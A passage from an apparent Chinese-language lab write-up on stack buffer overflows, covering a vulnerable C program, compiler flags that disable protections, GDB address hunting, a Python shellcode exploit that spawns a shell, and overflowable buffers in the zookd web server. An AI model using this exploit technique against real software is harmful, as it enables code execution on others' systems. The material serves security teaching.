syscall arg 1: SYS_exit (60) */</span><br><span class="line">        xorq    %rdi,%rdi               /* syscall arg 2: 0 */</span><br><span class="line">        syscall                         /* invoke syscall */</span><br><span class="line"></span><br><span class="line"> calladdr:</span><br><span class="line">        call    popladdr</span><br><span class="line">        .ascii  STRING</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>从本质上，合法的 <code>ret</code> 指令会返回到 <code>.text</code> 段中继续执行指令。不合法的 <code>ret</code> 指令会返回到理应不可执行的 <code>stack</code> 中执行指令。所以传统栈溢出攻击有一个前提: OS 认为栈是可以执行的，或者说不会刻意检查。</p>
+</blockquote>
+<h4 id="Writing-an-Exploit"><a href="#Writing-an-Exploit" class="headerlink" title="Writing an Exploit"></a>Writing an Exploit</h4><p>有了前面的背景知识，我们现在准备对一个真实程序执行第一次攻击。我们将让 C 程序稍微复杂一些，使攻击不那么明显。具体来说，程序现在（据说）打印它收到的每个输入的前 128 个字符：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">first128</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> input[<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">while</span> (read(STDIN_FILENO, input, <span class="number">1024</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    first128(input);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后编译（关于为什么要这样做，参见 <strong>TODO</strong> 部分）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -g -fno-stack-protector -z execstack vulnerable.c -o vulnerable -D_FORTIFY_SOURCE=0</span><br></pre></td></tr></table></figure>
+
+<p><strong>编译选项说明：</strong></p>
+<ul>
+<li><code>-g</code>：包含调试信息</li>
+<li><code>-fno-stack-protector</code>：禁用栈保护</li>
+<li><code>-z execstack</code>：使栈可执行</li>
+<li><code>-D_FORTIFY_SOURCE=0</code>：禁用缓冲区溢出检查</li>
+</ul>
+<p>现在我们需要构造正确的输入来溢出 <code>buffer</code>。特别是，我们需要知道：</p>
+<ol>
+<li>将返回地址设置为什么值</li>
+<li>在开始写入返回地址之前需要写入多少字节</li>
+</ol>
+<p><strong>使用 GDB 进行动态分析</strong></p>
+<p>为了找到这些信息，我们将使用 GDB，这是一个在低级别调试程序的便利工具。</p>
+<p>首先，启动我们的脆弱程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">env</span> - setarch -R ./vulnerable</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明：</strong></p>
+<ul>
+<li><code>env -</code> 使用干净的环境变量，环境变量存储在栈的高地址趋于，会影响栈的布局。</li>
+<li><code>setarch -R</code> 禁用地址空间随机化，现代 Linux 系统中默认开启 ASLR，每次栈的基址会发生变化。</li>
+</ul>
+<p>在另一个终端中，启动 GDB：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -p $(pgrep vulnerable)</span><br></pre></td></tr></table></figure>
+
+<p>这将找到名为 vulnerable 的程序的进程 ID，并将调试器附加到它。</p>
+<p><strong>GDB 调试步骤：</strong></p>
+<ol>
+<li><p><strong>设置断点并继续执行：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b first128</span><br><span class="line">Breakpoint 1 at 0x55555555516b: file x.c, line 7.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>输入测试数据触发断点：</strong><br>当输入一些数据到等待的 vulnerable 程序并按回车时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, first128 (str=0x555555558060 &lt;input&gt; &quot;x\n&quot;) at x.c:7</span><br><span class="line">7               strcpy(buffer, str);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>获取 buffer 地址：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print &amp;buffer[0]</span><br><span class="line">$1 = 0x7fffffffec90 &quot;&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>获取返回地址的存储位置：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info frame</span><br><span class="line">Stack level 0, frame at 0x7fffffffed20:</span><br><span class="line"> rip = 0x55555555519f in first128 (vulnerable.c:7); </span><br><span class="line">    saved rip = 0x5555555551e8</span><br><span class="line"> called by frame at 0x7fffffffed40</span><br><span class="line"> source language c.</span><br><span class="line"> Arglist at 0x7fffffffed10, args: </span><br><span class="line">    str=0x555555558040 &lt;input&gt; &quot;dmx\n&quot;</span><br><span class="line"> Locals at 0x7fffffffed10, Previous frame&#x27;s sp is 0x7fffffffed20</span><br><span class="line"> Saved registers:</span><br><span class="line">  rbp at 0x7fffffffed10, rip at 0x7fffffffed18</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>注意 <code>rip at 0x7fffffffed18</code>，这就是存储的返回地址的地址！</p>
+<p><strong>编写攻击利用脚本</strong></p>
+<p>现在我们有了编写攻击字符串所需的一切。手动编写会有点痛苦，所以让我们写一个小的 Python 程序来帮助：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os, sys, struct</span><br><span class="line"></span><br><span class="line">addr_buffer = <span class="number">0x7fffffffec90</span></span><br><span class="line">addr_retaddr = <span class="number">0x7fffffffed18</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们希望 buffer 首先保存 shellcode</span></span><br><span class="line">shellfile = <span class="built_in">open</span>(<span class="string">&quot;shellcode.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">shellcode = shellfile.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后我们想要填充到返回地址</span></span><br><span class="line">shellcode += <span class="string">b&quot;A&quot;</span> * ((addr_retaddr - addr_buffer) - <span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后我们写入 shellcode 的地址</span></span><br><span class="line"><span class="comment"># struct.pack(&quot;&lt;Q&quot;) 以小端格式写出 64 位整数</span></span><br><span class="line">shellcode += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, addr_buffer)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 shell code 写出到等待的 vulnerable 程序</span></span><br><span class="line">fp = os.fdopen(sys.stdout.fileno(), <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fp.write(shellcode)</span><br><span class="line">fp.flush()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将用户输入转发到底层程序</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sys.stdin.buffer.read1(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        fp.write(data)</span><br><span class="line">        fp.flush()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击载荷构造分析：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = [shellcode] + [padding] + [buffer_address]</span><br><span class="line">           ^从 buffer 开始 ^填充到返回地址位置  ^覆盖返回地址指向 buffer</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><strong>shellcode 部分</strong>：二进制形式的恶意代码</li>
+<li><strong>填充部分</strong>：用 ‘A’ 填充，直到到达返回地址存储位置</li>
+<li><strong>地址覆盖</strong>：将返回地址覆盖为 buffer 的地址</li>
+</ol>
+<p><strong>执行攻击：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./exploit.py | <span class="built_in">env</span> - setarch -R ./vulnerable</span><br></pre></td></tr></table></figure>
+
+<p>执行后看起来很空，但这是正常的！尝试输入 <code>ls</code>… 如果成功，你应该能看到 shell 提示符！</p>
+<div class="stack-visualization">
+    <div class="stack-container">
+        <!-- 正常栈布局 -->
+        <div class="stack-column">
+            <div class="stack-title">🔒 正常栈布局</div>
+            <div class="stack-frame">
+                <div class="stack-cell normal">
+                    <span class="address">高地址</span>
+                    <span class="content">main's frame</span>
+                    <span class="address">↑</span>
+                </div>
+                <div class="stack-cell return-addr">
+                    <span class="address">0x7fffffffed18</span>
+                    <span class="content">return address</span>
+                    <span class="address">8字节</span>
+                </div>
+                <div class="stack-cell saved-rbp">
+                    <span class="address">0x7fffffffed10</span>
+                    <span class="content">saved %rbp</span>
+                    <span class="address">8字节</span>
+                </div>
+                <div class="stack-cell buffer">
+                    <span class="address">0x7fffffffec90</span>
+                    <span class="content">buffer[128]</span>
+                    <span class="address">128字节</span>
+                </div>
+                <div class="stack-cell normal">
+                    <span class="address">低地址</span>
+                    <span class="content">padding</span>
+                    <span class="address">↓</span>
+                </div>
+            </div>
+        </div>
+        <!-- 攻击后栈布局 -->
+        <div class="stack-column">
+            <div class="stack-title">💀 攻击后栈布局</div>
+            <div class="stack-frame">
+                <div class="stack-cell normal">
+                    <span class="address">高地址</span>
+                    <span class="content">main's frame</span>
+                    <span class="address">↑</span>
+                </div>
+                <div class="stack-cell overflow">
+                    <span class="address">0x7fffffffed18</span>
+                    <span class="content">0x7fffffffec90</span>
+                    <span class="address">被覆盖!</span>
+                </div>
+                <div class="stack-cell overflow">
+                    <span class="address">0x7fffffffed10</span>
+                    <span class="content">AAAAAAAA</span>
+                    <span class="address">被覆盖</span>
+                </div>
+                <div class="stack-cell shellcode">
+                    <span class="address">0x7fffffffec90</span>
+                    <span class="content">shellcode + 填充</span>
+                    <span class="address">128字节</span>
+                </div>
+                <div class="stack-cell normal">
+                    <span class="address">低地址</span>
+                    <span class="content">padding</span>
+                    <span class="address">↓</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<h4 id="64-bit-Considerations"><a href="#64-bit-Considerations" class="headerlink" title="64-bit Considerations"></a>64-bit Considerations</h4><p>32 位和 64 位模式下缓冲区溢出攻击有两个主要差异，需要特别注意，否则会导致攻击失败。</p>
+<p><strong>Zeroes in addresses</strong></p>
+<p>大多数 64 位地址在其最高有效字节中都包含 <code>0x00</code>，这意味着我们通常不能直接写入它们；像 <code>strcpy</code> 和 <code>strcat</code> 这样的常见函数将 <code>\0</code> 视为字符串的结尾，因此会在遇到零字节时停止写入。</p>
+<p>好消息是，在小端序系统中，最高有效字节排在最后（即在较高的内存地址），所以通常这不会成为问题。终止的 <code>\0</code> 也会被复制，这可能就是我们需要的全部。在某些幸运情况下，我们试图覆盖的位置已经有所需数量的 <code>0x00</code>，因此提前停止是可以接受的（只要应用程序本身不添加额外内容）。</p>
+<p>如果需要在地址后写入更多内容，或者地址恰好是一个低地址，其中多个前导字节为 <code>0x00</code>，而被覆盖位置之前没有这些零字节，那么就需要寻找其他方法。</p>
+<p>这在 32 位系统上不是一个大问题。虽然地址可能意外包含 <code>0x00</code>，但相对较少发生。在 64 位系统上，几乎每个地址都会出现这种情况！</p>
+<p><strong>Arguments in Registers</strong></p>
+<p>在 32 位系统（特别是 i386）上，函数的调用约定相对自由。最常见的是 cdecl，其中函数参数通过栈传递。具体来说，参数在 <code>call</code> 指令之前按从右到左的顺序压入栈。</p>
+<p>这有一个非常巧妙的副作用，你可以通过改变栈上的内容来操纵函数的参数。例如，绕过 W^X（参见禁用现代防御）的一个巧妙方法是进行 “return to libc” 攻击。你不用 shellcode 的地址覆盖返回指针，而是在那里放置来自 libc 的 <code>execve</code> 地址。然后你会操纵栈上的各种值，这样当前函数返回到 <code>execve</code> 并查看栈获取参数时，它会看到像 <code>/bin/sh</code> 这样的参数。</p>
+<p>“遗憾的是”，在 x64 中，调用约定发生了相当大的变化。在 x64 中，使用 System V AMD64 ABI，其中参数主要通过寄存器传递（这是一个很好的视觉解释）。这破坏了传统的 return-to-libc 攻击，因为你不能再通过操纵栈来改变 libc 函数看到的参数（这是缓冲区溢出所能做的全部）。有一些方法可以绕过这个问题，例如使用 “借用代码块” 技术，以及返回导向编程的一般概念，但这些攻击要难得多。</p>
+<h4 id="Finding-Buffer-Overflows"><a href="#Finding-Buffer-Overflows" class="headerlink" title="Finding Buffer Overflows"></a>Finding Buffer Overflows</h4><p>如前所述，缓冲区溢出是由于在缓冲区中填充超过其预期容量的信息造成的。由于 C 语言没有任何内置的边界检查，溢出通常表现为写入超过字符数组末尾的位置。标准 C 库提供了许多用于复制或追加字符串的函数，这些函数不执行边界检查。它们包括：<code>strcat()</code>、<code>strcpy()</code>、<code>sprintf()</code> 和 <code>vsprintf()</code>。这些函数操作以空字符结尾的字符串，并且不检查接收字符串的溢出。<code>gets()</code> 是一个从 stdin 读取一行到缓冲区的函数，直到遇到终止换行符或 EOF。它不执行缓冲区溢出检查。如果你要匹配非空白字符序列（%s），或匹配来自指定集合的非空字符序列（%[]），而 char 指针指向的数组不够大，无法接受整个字符序列，并且你没有定义可选的最大字段宽度，那么 <code>scanf()</code> 系列函数也可能成为问题。如果这些函数中任何一个的目标是静态大小的缓冲区，而其他参数以某种方式源自用户输入，那么你很可能能够利用缓冲区溢出。</p>
+<p>我们发现的另一个常见编程结构是使用 while 循环从 stdin 或某个文件一次读取一个字符到缓冲区，直到到达行尾、文件尾或其他分隔符。这种类型的结构通常使用以下函数之一：<code>getc()</code>、<code>fgetc()</code> 或 <code>getchar()</code>。如果在 while 循环中没有明确的溢出检查，此类程序很容易被利用。</p>
+<p>总而言之，<code>grep(1)</code> 是你的朋友。免费操作系统及其实用程序的源代码是现成可用的。一旦你意识到许多商业操作系统实用程序都源自与免费操作系统相同的源代码，这个事实就变得相当有趣。使用源代码，伙计。</p>
+<p><strong>使用 grep 查找潜在漏洞：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在源代码中搜索危险函数</span></span><br><span class="line">grep -n <span class="string">&quot;strcpy\|strcat\|sprintf\|gets\|scanf&quot;</span> *.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索可能的缓冲区操作</span></span><br><span class="line">grep -n <span class="string">&quot;while.*getc\|while.*fgetc\|while.*getchar&quot;</span> *.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找固定大小的缓冲区声明</span></span><br><span class="line">grep -n <span class="string">&quot;char.*\[.*\]&quot;</span> *.c</span><br></pre></td></tr></table></figure>
+
+<p>这种源代码审计方法在发现真实软件中的安全漏洞方面非常有效，特别是在开源软件中，因为源代码的可用性使得安全研究人员能够进行深入的代码分析。</p>
+<h4 id="Disabling-Modern-Defenses"><a href="#Disabling-Modern-Defenses" class="headerlink" title="Disabling Modern Defenses"></a>Disabling Modern Defenses</h4><p>当试图在现代机器上进行缓冲区溢出攻击时，你需要处理几种防护措施：</p>
+<p><strong>Stack Canaries：</strong>编译器在二进制文件中注入代码片段，在函数的局部变量和下一个栈帧之间（至关重要的是，在返回地址之前）放置一个特殊值。就在函数返回之前，它检查 Stack Canaries 是否仍然具有正确的值，只有这样才会发出 <code>ret</code> 指令。这挫败了上述攻击，因为在我们试图到达返回地址的过程中，总是会用垃圾数据覆盖 Stack Canaries! 要在 gcc 中禁用 Stack Canaries ，传递 <code>-fno-stack-protector</code> 参数。</p>
+<p><strong>ASLR：</strong>这种机制被称为 ASLR，大致意味着内核会在程序启动时随机化程序在内存中的位置。这通常包括构成程序代码的指令、栈、堆，以及任何动态链接库的位置。启用此功能后，你不能再（轻易地）找出所需的任何地址，因此不知道用什么来覆盖返回地址！你可以通过 <code>setarch -R</code> 调用程序来告诉内核为给定程序禁用 ASLR。较旧版本的 setarch 还要求你将 <code>&quot;$(uname -m)&quot;</code> 作为第一个参数传递。注意这些解决方案是不够的：</p>
+<ul>
+<li>仅使用 <code>-no-pie</code> 是不够的，因为动态链接库仍然是随机化的（如果你关心 return-to-libc）</li>
+<li>仅使用 <code>-static</code> 是不够的，因为程序本身的地址仍然是随机化的</li>
+<li>即使两者都用，你的栈和堆位置仍然是随机化的</li>
+</ul>
+<p><strong>W^X：</strong>这是一个相当简单的防护机制，其中进程中的所有内存要么是可写的（如栈），要么是可执行的（如程序代码）。当启用此功能时（默认情况下是启用的），上面讨论的栈溢出将不起作用，因为你的 shell code（然后位于栈上）没有标记为可执行。当你试图返回到它时，CPU 会简单地拒绝继续。你可以使用 <code>execstack</code> 禁用此功能，或者在 gcc 中通过 <code>-z execstack</code> 链接你的程序。</p>
+<p><strong>Fortified Source：</strong>默认情况下，gcc 启用源码强化，当 gcc 能够确定所需边界时，它会用安全检查包装已知有问题的函数，如 <code>strcpy</code> 或 <code>strcat</code>。当这些检查到位时，试图溢出缓冲区的尝试可能会以如下方式终止你的程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** buffer overflow detected ***: ./vulnerable terminated</span><br></pre></td></tr></table></figure>
+
+<p>要解决这个问题，只需传递 <code>-D_FORTIFY_SOURCE=0</code>。</p>
+<p>关闭这些防护可能看起来像作弊，在某种意义上确实如此，但在试图教授栈粉碎背后的基本思想时是有帮助的。事实上，通常可以用更高级的攻击绕过这些防护，尽管那些远远超出了本文档的范围。</p>
+<p><strong>完整的编译命令示例：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁用所有现代防护的编译命令</span></span><br><span class="line">gcc -g -fno-stack-protector -z execstack -no-pie -static \</span><br><span class="line">    -D_FORTIFY_SOURCE=0 vulnerable.c -o vulnerable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行时禁用 ASLR</span></span><br><span class="line"><span class="built_in">env</span> - setarch -R ./vulnerable</span><br></pre></td></tr></table></figure>
+
+<p>这些防护机制的存在说明了现代系统安全的演进，但理解如何绕过它们对于学习底层攻击原理仍然很重要。在实际的安全研究和渗透测试中，攻击者会使用更复杂的技术来绕过这些防护。</p>
+<br>
+
+<h3 id="II-Read-the-source-Code"><a href="#II-Read-the-source-Code" class="headerlink" title="II. Read the source Code"></a>II. Read the source Code</h3><h4 id="zookd-c"><a href="#zookd-c" class="headerlink" title="zookd.c"></a>zookd.c</h4><ol>
+<li><strong>启动监听</strong></li>
+</ol>
+<ul>
+<li>zookd 首先通过 <code>start_server</code> 创建监听 socket，绑定端口，准备接受客户端连接。</li>
+</ul>
+<ol start="2">
+<li><strong>等待客户端连接</strong></li>
+</ol>
+<ul>
+<li>在 <code>run_server</code> 中，循环调用 <code>accept</code> 等待客户端的连接。</li>
+</ul>
+<ol start="3">
+<li><strong>多进程处理请求</strong></li>
+</ol>
+<ul>
+<li>每当有新连接到来，<code>fork</code> 一个子进程，专门处理该客户端请求。</li>
+<li>子进程调用 <code>process_client</code>，处理 HTTP 请求和响应。</li>
+<li>父进程关闭自己的 fd，继续等待下一个连接。</li>
+</ul>
+<ol start="4">
+<li><strong>HTTP 请求处理</strong></li>
+</ol>
+<ul>
+<li><code>http_request_line</code> 处理 HTTP 请求报文的第一行，并设置环境变量。</li>
+<li><code>env_deseialize</code> 设置环境变量，一开始环境变量都存放在 char[] 中，此函数提取其信息并实际设置环境变量。</li>
+<li><code>http_request_headers</code> 处理 HTTP 请求报文其他头部信息，并设置环境变量。</li>
+<li><code>http_serve</code> 正式处理进行 HTTP 服务。</li>
+</ul>
+<h4 id="http-c"><a href="#http-c" class="headerlink" title="http.c"></a>http.c</h4><p><strong>http_request_line</strong></p>
+<ol>
+<li>调用 <code>http_read_line</code> 函数读取 HTTP 请求行（如 <code>GET /foo.html HTTP/1.0</code>），将其解析并保存</li>
+<li>设置环境变量</li>
+<li>如果路径包含 ?，分离出查询字符串。</li>
+<li>调用 <code>url_decode</code> 函数对路径进行 URL 解码</li>
+</ol>
+<p>假设客户端发送如下 HTTP 请求行：<code>GET /cgi-bin/hello.py?user=alice HTTP/1.1</code></p>
+<p>逐步解析并设置环境变量: </p>
+<ol>
+<li><code>REQUEST_METHOD=GET</code></li>
+<li><code>SERVER_PROTOCOL=HTTP/1.1</code></li>
+<li><code>QUERY_STRING=user=alice</code></li>
+<li><code>REQUEST_URI=/cgi-bin/hello.py</code></li>
+<li><code>SERVER_NAME=zoobar.org</code></li>
+</ol>
+<p><strong>http_request_headers</strong></p>
+<ol>
+<li>每次调用 <code>http_read_line</code>，循环读取每一行头部。</li>
+<li>调用 <code>http_parse_line</code> 解析头部行。</li>
+<li>把解析出来的头部信息存入进程环境变量。</li>
+</ol>
+<p>假设客户端发送如下 HTTP 请求头部:<br><code>Host: localhost:8080</code><br><code>User-Agent: Mozilla/5.0</code><br><code>Accept: text/html</code><br><code>Cookie: session=dmx</code></p>
+<p>逐行解析并设置环境变量: </p>
+<ol>
+<li><code>HTTP_HOST=localhost:8080</code></li>
+<li><code>HTTP_USER_AGENT=Mozilla/5.0</code></li>
+<li><code>HTTP_ACCEPT=text/html</code></li>
+<li><code>HTTP_COOKIE=session=dmx</code></li>
+</ol>
+<p><strong>http_serve</strong></p>
+<p>根据客户端请求的路径，判断请求的资源类型，并调用相应的处理函数返回内容。</p>
+<ol>
+<li>用 <code>getcwd</code> 获取当前工作目录并设置环境变量。</li>
+<li>拼接请求路径。</li>
+<li>调用 <code>split_path</code>，设置 CGI 相关环境变量。</li>
+<li>判断资源类型</li>
+</ol>
+<ul>
+<li>如果是可执行文件（CGI 脚本），调用 <code>http_serve_executable</code>。</li>
+<li>如果是目录，调用 <code>http_serve_directory</code>。</li>
+<li>如果是普通文件，调用 <code>http_serve_file</code>。</li>
+<li>如果都不是，调用 <code>http_serve_none</code> 返回 404</li>
+</ul>
+<br>
+
+<h3 id="III-Find-potential-stack-overflow-vulnerabilities"><a href="#III-Find-potential-stack-overflow-vulnerabilities" class="headerlink" title="III. Find potential stack overflow vulnerabilities"></a>III. Find potential stack overflow vulnerabilities</h3><p>首先可能出现栈溢出的前提是定义了局部变量 <strong>char[*]</strong>，通过命令 <code>grep -n &quot;char.*\[.*\]&quot; http.c</code> 查找。</p>
+<p>同时还需要伴随着不检查长度的库函数，通过命令 <code>grep -n &quot;strcpy\|strcat\|sprintf\|gets\|scanf&quot; http.c</code> 查找。</p>
+<p>对比对比分析，可以锁定两个嫌疑人:</p>
+<ol>
+<li><code>http_request_headers</code> 中的局部变量 <code>char value[512]</code></li>
+<li><code>http_request_headers</code> 中的局部变量 <code>char envvar[512]</code></li>
+</ol>
+<p>如果头部名（去掉冒号）长度超过 507(512 - len(“HTTP_”)) 字节，会溢出 envvar。</p>
+<p>如果头部值（空格后内容）解码后长度超过 512 字节，会溢出 value。</p>
+<p><strong>但是 !</strong> 溢出不代表程序会崩溃，溢出一定会导致 <code>undefined behavior</code>，只有当溢出的内容覆盖到 <code>saved %rsp/%rip</code> 时，才会导致程序崩溃 !</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">http_request_headers</span><span class="params">(<span class="type">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> buf[<span class="number">8192</span>]; <span class="comment">/* static variables are not on the stack */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *r;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ----------------------------------</span></span><br><span class="line">    <span class="comment">// ! buf 最长为 8192 字节</span></span><br><span class="line">    <span class="comment">// ! envvar 和 value 最长为 512 字节</span></span><br><span class="line">    <span class="comment">// ! 可能会发生栈溢出</span></span><br><span class="line">    <span class="comment">// ----------------------------------</span></span><br><span class="line">    <span class="type">char</span> value[<span class="number">512</span>];</span><br><span class="line">    <span class="type">char</span> envvar[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* For lab 2: don&#x27;t remove this line. */</span></span><br><span class="line">    <span class="built_in">touch</span>(<span class="string">&quot;http_request_headers&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now parse HTTP headers */</span></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">http_read_line</span>(fd, buf, <span class="built_in">sizeof</span>(buf)) &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Socket IO error&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>) <span class="comment">/* end of headers */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        r = <span class="built_in">http_parse_line</span>(buf, envvar, value);</span><br><span class="line">        <span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">setenv</span>(envvar, value, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
